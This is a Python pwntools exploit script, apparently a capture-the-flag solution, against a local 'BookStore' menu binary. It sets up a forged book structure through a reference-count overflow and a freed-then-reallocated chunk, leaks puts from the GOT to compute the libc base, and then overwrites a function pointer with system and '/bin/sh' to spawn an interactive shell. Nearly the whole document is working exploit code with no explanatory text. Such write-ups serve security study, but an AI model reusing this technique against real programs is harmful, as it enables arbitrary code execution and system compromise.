from pwn import *

from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./BookStore"
bin = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

conn = process(file)
#gdb.attach(conn)

def menu(ch):
    conn.recvuntil("Your choice")
    conn.sendline(str(ch))

"""
00000000 book            struc ; (sizeof=0x3A, mappedto_6)
00000000 next            dq ?                    ; offset
00000008 brief_ptr       dq ?                    ; offset
00000010 title           db 32 dup(?)
00000030 ref_idx         db ?
00000031 references_to   db ?
00000032 format_func     dq ?
0000003A book            ends
"""

def add(title, b_len, brief, ref_title, best_selling=False):
    menu(1)
    conn.recvuntil("Title")
    conn.send(title)
    conn.recvuntil("brief size")
    conn.sendline(str(b_len))
    conn.recvuntil("brief")
    conn.send(brief)
    conn.recvuntil("book title")
    conn.send(ref_title)
    conn.recvuntil("Best Selling?")
    if best_selling:
        conn.sendline("y")
    else:
        conn.sendline("n")

def edit(old_title, new_title, b_len, brief, best_selling=False):
    menu(2)
    conn.recvuntil("Old title")
    conn.send(old_title)
    conn.recvuntil("title")
    conn.send(new_title)
    conn.recvuntil("brief size")
    conn.sendline(str(b_len))
    conn.recvuntil("brief")
    conn.send(brief)
    conn.recvuntil("Best Selling?")
    if best_selling:
        conn.sendline("y")
    else:
        conn.sendline("n")

def remove(title):
    menu(3)
    conn.recvuntil("Title")
    conn.send(title)

def list():
    menu(4)

# Leaking libc
add("title0\n", 0x50, "brief0\n", "\n")
add("title1\n", 0x50, "brief1\n", "\n", best_selling=True)
for i in range(0xff):
    add("title-"+str(i)+"\n", 0x50, "brief.\n", "title1\n", best_selling=False)

add("title3\n", 0x50, "brief3\n", "\n", best_selling=True)
remove("title0\n")

payload = p64(0) + p64(bin.got['puts']) + "a"*0x20 + "bb" + \
          p64(bin.symbols['strdup'])
payload = payload.ljust(0x47, "a")
add("title0\n", 0x47, payload, "\n")
list()
conn.recvuntil("a"*0x20)
conn.recvuntil("|")

puts_addr = u64(conn.recvn(6) + "\x00\x00")
libc.address = puts_addr - libc.symbols['puts']

payload = p64(0) + p64(next(libc.search("/bin/sh"))) + "a"*0x20 + "bb" + \
          p64(libc.symbols['system'])
payload = payload.ljust(0x47, "a")
edit("title0\n", "title0\n", 0x47, payload, "\n")

list()

log.info("Puts addr: " + hex(puts_addr))

conn.interactive()
